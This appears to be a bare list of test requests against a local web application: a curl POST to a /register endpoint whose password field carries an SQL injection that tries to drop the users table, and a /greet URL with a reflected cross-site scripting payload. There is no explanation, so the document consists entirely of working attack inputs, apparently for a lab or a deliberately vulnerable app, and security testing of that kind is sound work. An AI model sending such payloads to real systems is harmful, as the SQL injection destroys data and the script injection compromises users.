COMMANDS/REQUESTS:

curl -X POST http://localhost:5000/register \
     -H "Content-Type: application/json" \
     -d '{"username": "attacker", "password": "'\''; DROP TABLE users; --"}'

http://localhost:5000/greet?name=<script>alert("Hacked!")</script>

